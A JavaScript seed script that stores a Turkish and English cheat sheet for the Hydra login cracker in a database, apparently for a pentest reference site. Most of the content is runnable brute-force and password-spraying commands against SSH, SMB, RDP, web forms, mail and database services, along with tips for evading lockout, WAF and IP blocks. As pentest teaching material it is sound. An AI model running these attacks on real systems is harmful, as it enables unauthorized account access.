import dbConnect from '../lib/dbConnect.js';
import Cheatsheet from '../models/Cheatsheet.js';
import Category from '../models/Category.js';
import mongoose from 'mongoose';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envPath = path.join(__dirname, '..', '.env.local');
if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf-8').split(/\r?\n/);
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const idx = trimmed.indexOf('=');
        if (idx === -1) continue;
        const key = trimmed.slice(0, idx).trim();
        const val = trimmed.slice(idx + 1).trim();
        if (key && !(key in process.env)) process.env[key] = val;
    }
}

const contentTR = `# Hydra (THC-Hydra) - Online Password Cracking

## 1. Araç Tanımı
**Hydra**, ağ servislerine yönelik online brute-force ve dictionary saldırıları gerçekleştiren, paralel işlem yeteneğine sahip, modüler ve çok hızlı bir login cracker aracıdır. SSH, FTP, HTTP, SMB, RDP, MySQL gibi 50'den fazla protokolü destekler. Pentest süreçlerinde zayıf parolaları tespit etmek ve yetkisiz erişim elde etmek için kullanılır.

## 2. Kurulum
*   **Kali Linux**: \`apt install hydra\` (Varsayılan yüklü gelir)
*   **Debian/Ubuntu**: \`apt install hydra\`
*   **Kaynak Kod**: GitHub üzerinden indirilip derlenebilir (en güncel modüller için önerilir).
*   **GUI Versiyonu**: \`xhydra\` (Grafik arayüz).

## 3. Temel Kullanım

### Online Brute-Force Mantığı
Hydra, hedef servise canlı bağlantılar kurarak kullanıcı adı ve parola kombinasyonlarını dener. Offline cracking (Hashcat/John) aksine, ağ gecikmesi ve servis yanıt süreleri hızı etkiler.

### Service-Based Authentication Testleri
Her protokol (ssh, ftp, http) için özel modüller kullanır. Hedef servisin portu ve protokolü doğru belirtilmelidir.

### User/Password Wordlist Kullanımı
Tek bir kullanıcı/parola veya geniş wordlist dosyaları kullanılabilir.
\`\`\`bash
hydra -L users.txt -P pass.txt ssh://10.10.10.1
\`\`\`
**Açıklama:**
\`-L\` ile kullanıcı listesi, \`-P\` ile parola listesi verilir.

### Target-Service Protokol Seçimi
Protokol, URL şeması olarak (\`ssh://\`) veya modül parametresi (\`ssh\`) olarak belirtilir.

### Parallel Thread Mantığı
Hydra varsayılan olarak 16 thread kullanır. Servisin kapasitesine göre bu sayı artırılıp azaltılabilir (\`-t\`).

### Rate-Limit Yönetimi
Çok hızlı denemeler servisi kilitleyebilir veya IP banlanmasına neden olabilir. \`-W\` (wait) parametresi ile denemeler arasına gecikme konur.

### Timeout Yönetimi
Yanıt vermeyen servisler için timeout süresi \`-w\` ile ayarlanır.

### Hydra Modülleri
SSH, FTP, HTTP-POST-FORM, SMB, RDP, MySQL, PostgreSQL, Telnet gibi yaygın servisler için optimize edilmiş modüller bulunur.

### Verbose / Debug Seviyeleri
Saldırının detaylarını görmek için \`-V\` (denenen user/pass çiftleri) veya \`-d\` (debug) kullanılır.

## 4. İleri Seviye Kullanım

### http-post-form İleri Seviye Payload Formatı
Web form brute-force için özel format gerekir: \`"URL:Form Parameters:Failure String"\`.
\`\`\`bash
"/login.php:user=^USER^&pass=^PASS^:Login Failed"
\`\`\`

### CSRF Token Handling
Login formlarında CSRF token varsa, Hydra'nın bunu her istekte parse edip göndermesi gerekir. Bu genellikle karmaşık olup, custom script veya token'ı URL'den alan modüller gerektirebilir.

### Dynamic Parameter Injection
\`^USER^\` ve \`^PASS^\` yer tutucuları, wordlist'ten gelen değerlerle dinamik olarak değiştirilir.

### Fail/Success Regex Tanımlama
Web login başarısız olduğunda dönen hata mesajı (Failure String) veya başarılı olduğunda dönen mesaj/yönlendirme (Success String) tanımlanmalıdır. \`S=Success\` veya \`F=Failure\` öneki kullanılır.

### Reverse Brute-Force
Tek bir zayıf parola (örn: "Password123") kullanılarak binlerce kullanıcı adı üzerinde deneme yapılır. Account lockout riskini minimize eder.

### Password Spraying
Reverse brute-force'un bir varyasyonudur. Belirli bir zaman aralığında, her kullanıcı için sadece 1-2 parola denenir.

### Hybrid Username Generation
Kullanıcı listesi yoksa, belirli patternlere göre (örn: admin, root, user1) kullanıcı adları üretilebilir.

### Parallel Distributed Cracking
Çok büyük wordlistler için wordlist bölünerek (split) birden fazla makinede Hydra çalıştırılabilir.

### Proxy Desteği Üzerinden Hydra
\`HYDRA_PROXY_HTTP\` ortam değişkeni veya \`-x\` parametresi ile trafik proxy üzerinden geçirilir.

### Tor + Hydra Entegrasyonu
Anonimlik için Tor (SOCKS5) kullanılabilir ancak hız ciddi oranda düşer.

### VPN Üstünden Brute-Force
Kurumsal ağlara VPN ile bağlandıktan sonra internal IP'lere saldırı düzenlenir.

### Custom Module Mantığı
Desteklenmeyen protokoller veya özel authentication mekanizmaları için C ile custom modül yazılabilir.

### HTTP Header Forging
User-Agent veya Cookie gibi HTTP başlıkları, form parametrelerine eklenerek (header:value) manipüle edilebilir.

### Burp → Hydra Param Mapping
Burp Suite ile yakalanan login isteği analiz edilerek Hydra formatına (\`http-post-form\`) dönüştürülür.

### Account Lockout Risk Analizi
Active Directory gibi ortamlarda 3-5 başarısız denemede hesap kilitlenir. Bu durumda Password Spraying kullanılmalıdır.

### Anti-Automation Bypass Teknikleri
WAF veya IPS engellemesini aşmak için User-Agent değiştirme, delay ekleme (\`-W\`) ve thread düşürme (\`-t\`) teknikleri uygulanır.

### Slow Service Optimization (RDP, SSH, SMB)
Bu protokoller handshake süreçleri nedeniyle yavaştır. Thread sayısı düşük tutulmalı (\`-t 4\`) ve timeout artırılmalıdır.

### High-Latency Network Brute-Force Stratejileri
Yüksek gecikmeli ağlarda timeout (\`-w\`) artırılmalı ve thread sayısı optimize edilmelidir.

## 5. Açıklamalı Komutlar (GENİŞ LİSTE)

### Temel Argümanlar

**Komut:**
\`\`\`bash
hydra -l admin -P pass.txt ssh://10.10.10.5
\`\`\`
**Açıklama:**
SSH servisine admin kullanıcı adıyla wordlist kullanarak brute-force saldırısı yapar.
**Argüman Açıklamaları:**
*   **-l**: Tek kullanıcı adı (login).
*   **-P**: Parola wordlist dosyası.
*   **ssh://**: Hedef protokol.

**Komut:**
\`\`\`bash
hydra -L users.txt -p Password123 ftp://192.168.1.10
\`\`\`
**Açıklama:**
FTP servisine kullanıcı listesi ve tek bir parola ile saldırır (Password Spraying).
**Argüman Açıklamaları:**
*   **-L**: Kullanıcı adı wordlist dosyası.
*   **-p**: Tek parola.

**Komut:**
\`\`\`bash
hydra -l root -P rockyou.txt -s 2222 -t 4 ssh://target.com
\`\`\`
**Açıklama:**
SSH servisi standart dışı 2222 portunda çalışıyorsa port belirtilir.
**Argüman Açıklamaları:**
*   **-s**: Port seçimi.
*   **-t**: Thread sayısı (SSH için düşük önerilir).

**Komut:**
\`\`\`bash
hydra -L users.txt -P pass.txt -f -V -o found.txt smb://10.10.10.5
\`\`\`
**Açıklama:**
SMB servisine saldırır, ilk bulduğu parolada durur, detaylı çıktı verir ve sonucu dosyaya yazar.
**Argüman Açıklamaları:**
*   **-f**: İlk başarılı denemede durdur (exit on found).
*   **-V**: Denenen kombinasyonları göster (Verbose).
*   **-o**: Output dosyası.

**Komut:**
\`\`\`bash
hydra -l admin -e nsr -P pass.txt rdp://192.168.1.20
\`\`\`
**Açıklama:**
RDP servisine saldırırken ek parola kontrolleri yapar.
**Argüman Açıklamaları:**
*   **-e nsr**: "n" null password, "s" login as pass, "r" reverse login.

### HTTP / Web Form Argümanları

**Komut:**
\`\`\`bash
hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
\`\`\`
**Açıklama:**
HTTP POST login formuna saldırır.
**Argüman Açıklamaları:**
*   **http-post-form**: Modül adı.
*   **"/login.php..."**: URL path, parametreler ve failure string.
*   **^USER^**: Kullanıcı adı yer tutucusu.
*   **^PASS^**: Parola yer tutucusu.
*   **F=**: Failure string (Hatalı girişte sayfada görünen metin).

**Komut:**
\`\`\`bash
hydra -L users.txt -P pass.txt target.com http-get "/admin:401"
\`\`\`
**Açıklama:**
Basic Authentication (HTTP 401) korumalı dizine saldırır.
**Argüman Açıklamaları:**
*   **http-get**: HTTP GET metodu.
*   **"/admin"**: Korunan dizin.

**Komut:**
\`\`\`bash
hydra -l admin -P pass.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:S=Welcome" -H "Cookie: sessid=123"
\`\`\`
**Açıklama:**
Cookie header ekleyerek ve success string kontrolü yaparak saldırır.
**Argüman Açıklamaları:**
*   **S=**: Success string (Başarılı girişte sayfada görünen metin).
*   **-H**: Header ekleme.

### Protocol Argümanları

**Komut:**
\`\`\`bash
hydra -L users.txt -P pass.txt mysql://10.10.10.5
\`\`\`
**Açıklama:**
MySQL veritabanı sunucusuna brute-force.

**Komut:**
\`\`\`bash
hydra -l administrator -P pass.txt rdp://192.168.1.10
\`\`\`
**Açıklama:**
Remote Desktop Protocol (RDP) servisine saldırı.

**Komut:**
\`\`\`bash
hydra -L emails.txt -P pass.txt smtp://mail.target.com
\`\`\`
**Açıklama:**
SMTP sunucusuna (mail gönderimi) authentication testi.

**Komut:**
\`\`\`bash
hydra -l postgres -P pass.txt postgres://10.10.10.5
\`\`\`
**Açıklama:**
PostgreSQL veritabanı brute-force.

**Komut:**
\`\`\`bash
hydra -P pass.txt -t 32 redis://10.10.10.5
\`\`\`
**Açıklama:**
Redis sunucusuna (genellikle sadece parola gerektirir) saldırı.

### Proxy / Network

**Komut:**
\`\`\`bash
hydra -l admin -P pass.txt -x 4:6:a http-get://target.com
\`\`\`
**Açıklama:**
Wordlist yerine brute-force maskesi ile parola üretir.
**Argüman Açıklamaları:**
*   **-x**: Min:Max:Charset (4-6 karakter, sadece küçük harf).

**Komut:**
\`\`\`bash
HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -l admin -P pass.txt http-get://target.com
\`\`\`
**Açıklama:**
Trafiği yerel proxy (örn: Burp Suite) üzerinden geçirir.

### Anti-Rate-Limit / IDS Bypass

**Komut:**
\`\`\`bash
hydra -l admin -P pass.txt -W 5 -t 1 ssh://10.10.10.5
\`\`\`
**Açıklama:**
Her deneme arasında 5 saniye bekler ve tek thread kullanır (Stealthy).
**Argüman Açıklamaları:**
*   **-W 5**: 5 saniye bekleme süresi.
*   **-t 1**: Tek thread.

## 6. Gerçek Pentest Senaryoları

### SSH Brute-Force (Low Latency)
\`\`\`bash
hydra -L users.txt -P rockyou.txt -t 4 -f ssh://192.168.1.100
\`\`\`
**Açıklama:**
Yerel ağdaki Linux sunucuya standart SSH saldırısı. SSH servisi çok fazla paralel bağlantıyı sevmediği için \`-t 4\` kullanılır.

### HTTP Login Brute-Force (CSRF Bypass)
\`\`\`bash
hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid password"
\`\`\`
**Açıklama:**
Basit bir web login formuna, "Invalid password" hatasını baz alarak saldırı.

### SMB Parola Denemesi
\`\`\`bash
hydra -l Administrator -P pass.txt smb://10.10.10.5
\`\`\`
**Açıklama:**
Windows makinesindeki SMB paylaşımına erişim denemesi.

### RDP Brute-Force
\`\`\`bash
hydra -l user -P pass.txt -t 1 -V rdp://192.168.1.50
\`\`\`
**Açıklama:**
RDP bağlantıları yavaştır ve kaynak tüketir, bu yüzden tek thread ve verbose mod ile kontrollü gidilir.

### POP3 / IMAP Parola Kırma
\`\`\`bash
hydra -L emails.txt -P pass.txt pop3://mail.server.com
\`\`\`
**Açıklama:**
Mail sunucusundan e-posta çekmek için kullanılan hesapları test eder.

### FTP Default Credentials Testi
\`\`\`bash
hydra -C default_pass.txt ftp://192.168.1.10
\`\`\`
**Açıklama:**
\`-C\` parametresi ile "user:pass" formatındaki default credential listesini dener.

### Account Lockout Sınırına Göre Password Spraying
\`\`\`bash
hydra -L domain_users.txt -p "Summer2024!" -t 1 -W 2 smb://10.10.10.5
\`\`\`
**Açıklama:**
Hesapların kilitlenmemesi için tek bir parola ("Summer2024!") tüm kullanıcılarda denenir.

### Reverse Brute-Force
\`\`\`bash
hydra -L users.txt -p "123456" ssh://10.10.10.5
\`\`\`
**Açıklama:**
Çok zayıf bir parolayı (123456) kullanan herhangi bir kullanıcıyı bulmaya çalışır.

### VPN Cihazları Üzerinde Brute-Force
\`\`\`bash
hydra -l vpnuser -P pass.txt -s 443 https-post-form "/vpn/login:username=^USER^&password=^PASS^:F=Auth Failed" 10.10.10.1
\`\`\`
**Açıklama:**
SSL VPN web arayüzüne yönelik saldırı.

### Web Login Üzerinde Success/Failure Regex Tespiti
\`\`\`bash
# Önce manuel test yapıp hata mesajını belirleyin
hydra -l admin -P pass.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:F=Username or password incorrect"
\`\`\`
**Açıklama:**
Doğru regex (F=...) saldırının başarısı için kritiktir.

### Proxy/Tor Üzerinden Brute-Force
\`\`\`bash
hydra -l admin -P pass.txt -x 4:4:a -t 4 --proxy socks5://127.0.0.1:9050 ssh://target.onion
\`\`\`
**Açıklama:**
Tor ağı üzerindeki bir servise (hidden service) saldırı.

### Load-Balancer Arkasındaki Login Endpoint
\`\`\`bash
hydra -l admin -P pass.txt target.com http-post-form "/auth:user=^USER^&pass=^PASS^:F=Error" -H "X-Forwarded-For: 127.0.0.1"
\`\`\`
**Açıklama:**
IP tabanlı engellemeleri aşmak veya logları manipüle etmek için header eklenir.

### Password Policy Analizi
\`\`\`bash
hydra -l user -P policy_compliant_passwords.txt ssh://10.10.10.5
\`\`\`
**Açıklama:**
Kurumun parola politikasına (örn: en az 8 karakter, büyük/küçük harf) uyan bir wordlist ile test.

### SMTP AUTH Brute-Force
\`\`\`bash
hydra -l info@target.com -P pass.txt smtp-enum://mail.target.com
\`\`\`
**Açıklama:**
SMTP sunucusunda VRFY/EXPN komutları veya AUTH login dener.

### MySQL ve MSSQL Login Denemeleri
\`\`\`bash
hydra -l sa -P pass.txt mssql://10.10.10.5
\`\`\`
**Açıklama:**
MSSQL 'sa' (system administrator) hesabı için parola denemesi.

### Internal Network Pivot Sonrası Brute-Force
\`\`\`bash
proxychains hydra -L internal_users.txt -P pass.txt smb://192.168.50.10
\`\`\`
**Açıklama:**
Pivot edilen ağda proxychains aracı ile Hydra'yı tünelleyerek saldırı.

## 8. Best Practices (Uzman Seviye)

*   **Thread Ayarı**: Servisin kapasitesine göre ayarlayın. SSH için 4, HTTP için 16-32, RDP için 1-2 thread idealdir.
*   **Account Lockout**: Active Directory ortamlarında asla standart brute-force yapmayın, Password Spraying tercih edin.
*   **Password Spraying**: Her zaman önce spraying (1 parola -> N kullanıcı) deneyin, lockout riskini sıfırlar.
*   **Bant Genişliği**: Düşük bant genişliğinde thread sayısını azaltın, paket kaybı yanlış negatiflere yol açar.
*   **Doğru Regex**: HTTP form saldırılarında "F=" (failure) veya "S=" (success) string'ini tarayıcıda manuel test ederek kesinleştirin.
*   **Timeout Artırma**: VPN veya Proxy kullanırken \`-w\` parametresini artırın (örn: \`-w 10\`).
*   **SSH Optimizasyonu**: SSH saldırılarında en hızlı ve stabil sonuç için \`-t 4\` önerilir.
*   **Tor Hızı**: Tor kullanımında hızın çok düşeceğini kabul edin ve wordlist'i buna göre küçültün.
*   **High-Latency**: Gecikmeli ağlarda Hydra'nın hata vermemesi için timeout ve retry ayarlarını gevşetin.
*   **Input Sanitization**: Bazı formlar özel karakterleri filtreleyebilir, wordlist'i buna göre seçin.
*   **Alternatif Araçlar**: Hydra başarısız olursa veya modül yetersizse Medusa veya Patator deneyin.

## 9. Sık Yapılan Hatalar

*   **Yanlış Pattern**: Success/Failure regex'inin yanlış tanımlanması sonucu Hydra'nın her denemeyi başarılı veya başarısız sanması.
*   **Yanlış Endpoint**: Login formunun action URL'sinin yanlış verilmesi (örn: \`/login\` yerine \`/login.php\`).
*   **CSRF İhmali**: CSRF token gerektiren formlarda token'ı handle etmemek (Saldırı başarısız olur).
*   **Yüksek Thread**: Thread sayısını çok yüksek (örn: 64) bırakıp servisi DoS etmek veya lockout tetiklemek.
*   **Parametre Formatı**: HTTP-POST-FORM parametre ayırıcılarının (\`:\`) yanlış kullanılması.
*   **Cookie Eksikliği**: Session cookie gerektiren sayfalarda cookie header'ını eklememek.
*   **Proxy Hatası**: Proxy ayarlarının yanlış yapılandırılması sonucu trafiğin gitmemesi.
*   **DNS Delay**: \`-n\` kullanılmadığı için her istekte DNS çözümlemesi yapılması ve saldırının yavaşlaması.
*   **IP Block**: WAF veya Fail2Ban gibi mekanizmaların tetiklenmesi (Delay kullanın).
`;

const contentEN = `# Hydra (THC-Hydra) - Online Password Cracking

## 1. Tool Definition
**Hydra** is a modular, parallelized, and very fast login cracker that supports online brute-force and dictionary attacks against network services. It supports over 50 protocols including SSH, FTP, HTTP, SMB, RDP, and MySQL. It is used in penetration testing to identify weak passwords and gain unauthorized access.

## 2. Installation
*   **Kali Linux**: \`apt install hydra\` (Pre-installed)
*   **Debian/Ubuntu**: \`apt install hydra\`
*   **Source Code**: Can be compiled from GitHub (recommended for latest modules).
*   **GUI Version**: \`xhydra\` (Graphical interface).

## 3. Basic Usage

### Online Brute-Force Logic
Hydra establishes live connections to the target service to try username/password combinations. Unlike offline cracking (Hashcat/John), network latency and service response times affect speed.

### Service-Based Authentication Tests
Uses specific modules for each protocol (ssh, ftp, http). Target port and protocol must be specified correctly.

### User/Password Wordlist Usage
Can use single user/pass or large wordlist files.
\`\`\`bash
hydra -L users.txt -P pass.txt ssh://10.10.10.1
\`\`\`
**Description:**
\`-L\` for user list, \`-P\` for password list.

### Target-Service Protocol Selection
Protocol is specified as URL scheme (\`ssh://\`) or module parameter (\`ssh\`).

### Parallel Thread Logic
Hydra uses 16 threads by default. This can be adjusted (\`-t\`) based on service capacity.

### Rate-Limit Management
Too fast attempts can lock the service or ban the IP. \`-W\` (wait) adds delay between attempts.

### Timeout Management
Timeout for unresponsive services is set with \`-w\`.

### Hydra Modules
Optimized modules exist for common services like SSH, FTP, HTTP-POST-FORM, SMB, RDP, MySQL, PostgreSQL, Telnet.

### Verbose / Debug Levels
Use \`-V\` (show tried user/pass pairs) or \`-d\` (debug) to see attack details.

## 4. Advanced Usage

### http-post-form Advanced Payload Format
Specific format required for web form brute-force: \`"URL:Form Parameters:Failure String"\`.
\`\`\`bash
"/login.php:user=^USER^&pass=^PASS^:Login Failed"
\`\`\`

### CSRF Token Handling
If login forms have CSRF tokens, Hydra needs to parse and send it with every request. This is complex and may require custom scripts or token-aware modules.

### Dynamic Parameter Injection
\`^USER^\` and \`^PASS^\` placeholders are dynamically replaced with values from the wordlist.

### Fail/Success Regex Definition
Must define the Failure String (error message on failed login) or Success String (message/redirect on success). Use \`S=Success\` or \`F=Failure\` prefix.

### Reverse Brute-Force
Trying one weak password (e.g., "Password123") against thousands of usernames. Minimizes account lockout risk.

### Password Spraying
A variation of reverse brute-force. Trying only 1-2 passwords per user over a time period.

### Hybrid Username Generation
If no user list exists, usernames can be generated based on patterns (e.g., admin, root, user1).

### Parallel Distributed Cracking
For huge wordlists, the list can be split and Hydra run on multiple machines.

### Hydra over Proxy Support
Traffic is routed through proxy using \`HYDRA_PROXY_HTTP\` env var or \`-x\` parameter.

### Tor + Hydra Integration
Tor (SOCKS5) can be used for anonymity but speed drops significantly.

### Brute-Force over VPN
Attacking internal IPs after connecting to corporate networks via VPN.

### Custom Module Logic
Custom modules can be written in C for unsupported protocols or custom auth mechanisms.

### HTTP Header Forging
HTTP headers like User-Agent or Cookie can be manipulated by adding them to form parameters (header:value).

### Burp → Hydra Param Mapping
Analyzing login requests captured with Burp Suite and converting them to Hydra format (\`http-post-form\`).

### Account Lockout Risk Analysis
In environments like Active Directory, accounts lock after 3-5 failed attempts. Password Spraying must be used.

### Anti-Automation Bypass Techniques
Techniques like changing User-Agent, adding delay (\`-W\`), and reducing threads (\`-t\`) to bypass WAF or IPS.

### Slow Service Optimization (RDP, SSH, SMB)
These protocols are slow due to handshakes. Threads should be kept low (\`-t 4\`) and timeout increased.

### High-Latency Network Brute-Force Strategies
Increase timeout (\`-w\`) and optimize threads in high-latency networks.

## 5. Annotated Commands (EXTENSIVE LIST)

### Basic Arguments

**Command:**
\`\`\`bash
hydra -l admin -P pass.txt ssh://10.10.10.5
\`\`\`
**Description:**
Brute-force SSH service with admin username and password list.
**Argument Explanations:**
*   **-l**: Single username.
*   **-P**: Password wordlist file.
*   **ssh://**: Target protocol.

**Command:**
\`\`\`bash
hydra -L users.txt -p Password123 ftp://192.168.1.10
\`\`\`
**Description:**
Attack FTP service with user list and single password (Password Spraying).
**Argument Explanations:**
*   **-L**: Username wordlist file.
*   **-p**: Single password.

**Command:**
\`\`\`bash
hydra -l root -P rockyou.txt -s 2222 -t 4 ssh://target.com
\`\`\`
**Description:**
Specify port if SSH is running on non-standard port 2222.
**Argument Explanations:**
*   **-s**: Port selection.
*   **-t**: Thread count (Low recommended for SSH).

**Command:**
\`\`\`bash
hydra -L users.txt -P pass.txt -f -V -o found.txt smb://10.10.10.5
\`\`\`
**Description:**
Attack SMB, stop on first success, show verbose output, write to file.
**Argument Explanations:**
*   **-f**: Stop on first found credential.
*   **-V**: Verbose (show attempts).
*   **-o**: Output file.

**Command:**
\`\`\`bash
hydra -l admin -e nsr -P pass.txt rdp://192.168.1.20
\`\`\`
**Description:**
Attack RDP with additional password checks.
**Argument Explanations:**
*   **-e nsr**: "n" null password, "s" login as pass, "r" reverse login.

### HTTP / Web Form Arguments

**Command:**
\`\`\`bash
hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
\`\`\`
**Description:**
Attack HTTP POST login form.
**Argument Explanations:**
*   **http-post-form**: Module name.
*   **"/login.php..."**: URL path, params, and failure string.
*   **^USER^**: Username placeholder.
*   **^PASS^**: Password placeholder.
*   **F=**: Failure string.

**Command:**
\`\`\`bash
hydra -L users.txt -P pass.txt target.com http-get "/admin:401"
\`\`\`
**Description:**
Attack Basic Authentication (HTTP 401) protected directory.
**Argument Explanations:**
*   **http-get**: HTTP GET method.
*   **"/admin"**: Protected directory.

**Command:**
\`\`\`bash
hydra -l admin -P pass.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:S=Welcome" -H "Cookie: sessid=123"
\`\`\`
**Description:**
Attack with Cookie injection and success string check.
**Argument Explanations:**
*   **S=**: Success string.
*   **-H**: Add Header.

### Protocol Arguments

**Command:**
\`\`\`bash
hydra -L users.txt -P pass.txt mysql://10.10.10.5
\`\`\`
**Description:**
Brute-force MySQL database server.

**Command:**
\`\`\`bash
hydra -l administrator -P pass.txt rdp://192.168.1.10
\`\`\`
**Description:**
Attack Remote Desktop Protocol (RDP).

**Command:**
\`\`\`bash
hydra -L emails.txt -P pass.txt smtp://mail.target.com
\`\`\`
**Description:**
Test authentication on SMTP server.

**Command:**
\`\`\`bash
hydra -l postgres -P pass.txt postgres://10.10.10.5
\`\`\`
**Description:**
PostgreSQL database brute-force.

**Command:**
\`\`\`bash
hydra -P pass.txt -t 32 redis://10.10.10.5
\`\`\`
**Description:**
Attack Redis server (usually password only).

### Proxy / Network

**Command:**
\`\`\`bash
hydra -l admin -P pass.txt -x 4:6:a http-get://target.com
\`\`\`
**Description:**
Generate passwords with mask instead of wordlist.
**Argument Explanations:**
*   **-x**: Min:Max:Charset (4-6 chars, lowercase).

**Command:**
\`\`\`bash
HYDRA_PROXY_HTTP=http://127.0.0.1:8080 hydra -l admin -P pass.txt http-get://target.com
\`\`\`
**Description:**
Route traffic through local proxy (e.g., Burp Suite).

### Anti-Rate-Limit / IDS Bypass

**Command:**
\`\`\`bash
hydra -l admin -P pass.txt -W 5 -t 1 ssh://10.10.10.5
\`\`\`
**Description:**
Wait 5 seconds between attempts, use 1 thread (Stealthy).
**Argument Explanations:**
*   **-W 5**: 5 seconds wait time.
*   **-t 1**: Single thread.

## 6. Real Pentest Scenarios

### SSH Brute-Force (Low Latency)
\`\`\`bash
hydra -L users.txt -P rockyou.txt -t 4 -f ssh://192.168.1.100
\`\`\`
**Description:**
Standard SSH attack on local Linux server. \`-t 4\` is used as SSH dislikes high concurrency.

### HTTP Login Brute-Force (CSRF Bypass)
\`\`\`bash
hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid password"
\`\`\`
**Description:**
Attack on simple web login form based on "Invalid password" error.

### SMB Password Attempt
\`\`\`bash
hydra -l Administrator -P pass.txt smb://10.10.10.5
\`\`\`
**Description:**
Attempt access to SMB share on Windows machine.

### RDP Brute-Force
\`\`\`bash
hydra -l user -P pass.txt -t 1 -V rdp://192.168.1.50
\`\`\`
**Description:**
RDP is slow and resource intensive, so single thread and verbose is used.

### POP3 / IMAP Password Cracking
\`\`\`bash
hydra -L emails.txt -P pass.txt pop3://mail.server.com
\`\`\`
**Description:**
Test accounts used to retrieve emails from mail server.

### FTP Default Credentials Test
\`\`\`bash
hydra -C default_pass.txt ftp://192.168.1.10
\`\`\`
**Description:**
Try default "user:pass" list using \`-C\` parameter.

### Password Spraying (Account Lockout Safe)
\`\`\`bash
hydra -L domain_users.txt -p "Summer2024!" -t 1 -W 2 smb://10.10.10.5
\`\`\`
**Description:**
Try single password ("Summer2024!") against all users to avoid lockout.

### Reverse Brute-Force
\`\`\`bash
hydra -L users.txt -p "123456" ssh://10.10.10.5
\`\`\`
**Description:**
Try to find any user using a very weak password (123456).

### Brute-Force on VPN Devices
\`\`\`bash
hydra -l vpnuser -P pass.txt -s 443 https-post-form "/vpn/login:username=^USER^&password=^PASS^:F=Auth Failed" 10.10.10.1
\`\`\`
**Description:**
Attack SSL VPN web interface.

### Success/Failure Regex Detection on Web Login
\`\`\`bash
# Determine error message manually first
hydra -l admin -P pass.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:F=Username or password incorrect"
\`\`\`
**Description:**
Correct regex (F=...) is critical for success.

### Brute-Force over Proxy/Tor
\`\`\`bash
hydra -l admin -P pass.txt -x 4:4:a -t 4 --proxy socks5://127.0.0.1:9050 ssh://target.onion
\`\`\`
**Description:**
Attack a hidden service on Tor network.

### Login Endpoint behind Load-Balancer
\`\`\`bash
hydra -l admin -P pass.txt target.com http-post-form "/auth:user=^USER^&pass=^PASS^:F=Error" -H "X-Forwarded-For: 127.0.0.1"
\`\`\`
**Description:**
Add headers to bypass IP blocking or manipulate logs.

### Password Policy Analysis
\`\`\`bash
hydra -l user -P policy_compliant_passwords.txt ssh://10.10.10.5
\`\`\`
**Description:**
Test with wordlist compliant with corporate password policy.

### SMTP AUTH Brute-Force
\`\`\`bash
hydra -l info@target.com -P pass.txt smtp-enum://mail.target.com
\`\`\`
**Description:**
Try VRFY/EXPN or AUTH login on SMTP server.

### MySQL and MSSQL Login Attempts
\`\`\`bash
hydra -l sa -P pass.txt mssql://10.10.10.5
\`\`\`
**Description:**
Password attempt for MSSQL 'sa' account.

### Brute-Force after Internal Network Pivot
\`\`\`bash
proxychains hydra -L internal_users.txt -P pass.txt smb://192.168.50.10
\`\`\`
**Description:**
Attack pivoted network tunneling Hydra via proxychains.

## 8. Best Practices (Expert Level)

*   **Thread Tuning**: Adjust to service capacity. 4 for SSH, 16-32 for HTTP, 1-2 for RDP.
*   **Account Lockout**: Never do standard brute-force in AD environments, use Password Spraying.
*   **Password Spraying**: Always try spraying first (1 pass -> N users) to zero lockout risk.
*   **Bandwidth**: Reduce threads on low bandwidth, packet loss causes false negatives.
*   **Correct Regex**: Manually verify "F=" (failure) or "S=" (success) string in browser for HTTP forms.
*   **Increase Timeout**: Increase \`-w\` (e.g., \`-w 10\`) when using VPN or Proxy.
*   **SSH Optimization**: \`-t 4\` is recommended for fastest and most stable SSH results.
*   **Tor Speed**: Accept that Tor is slow and reduce wordlist size accordingly.
*   **High-Latency**: Relax timeout and retry settings on high-latency networks.
*   **Input Sanitization**: Some forms filter special chars, choose wordlist accordingly.
*   **Alternatives**: Try Medusa or Patator if Hydra fails or lacks a module.

## 9. Common Mistakes

*   **Wrong Pattern**: Incorrect Success/Failure regex causing Hydra to report false positives/negatives.
*   **Wrong Endpoint**: Incorrect action URL for login form (e.g., \`/login\` instead of \`/login.php\`).
*   **Ignoring CSRF**: Not handling CSRF tokens on forms requiring them (Attack fails).
*   **High Threads**: Leaving threads too high (e.g., 64) causing DoS or lockout.
*   **Param Format**: Incorrect use of separators (\`:\`) in HTTP-POST-FORM parameters.
*   **Missing Cookie**: Not adding cookie header for pages requiring session cookies.
*   **Proxy Error**: Incorrect proxy configuration resulting in no traffic.
*   **DNS Delay**: Not using \`-n\`, causing DNS resolution on every request and slowing down attack.
*   **IP Block**: Triggering WAF or Fail2Ban mechanisms (Use Delay).
`;

async function addHydra() {
    try {
        await dbConnect();
        console.log('Connected to DB. Adding Hydra cheatsheet...');

        let category = await Category.findOne({ 'name.en': 'Password Cracking' });
        if (!category) {
            console.log('Category "Password Cracking" not found, creating...');
            category = await Category.create({
                name: { tr: 'Parola Kırma', en: 'Password Cracking' },
                description: { tr: 'Online ve offline parola kırma araçları', en: 'Online and offline password cracking tools' },
                slug: 'password-cracking',
                icon: 'Lock'
            });
        }

        const cheatsheetData = {
            title: {
                tr: 'Hydra Cheat Sheet',
                en: 'Hydra Cheat Sheet'
            },
            description: {
                tr: contentTR,
                en: contentEN
            },
            category: category._id,
            tags: ['hydra', 'brute-force', 'password', 'cracking', 'ssh', 'ftp', 'http', 'login']
        };

        const result = await Cheatsheet.findOneAndUpdate(
            { 'title.en': 'Hydra Cheat Sheet' },
            cheatsheetData,
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        console.log('Hydra cheatsheet added/updated successfully:', result.title);

    } catch (error) {
        console.error('Error:', error);
    } finally {
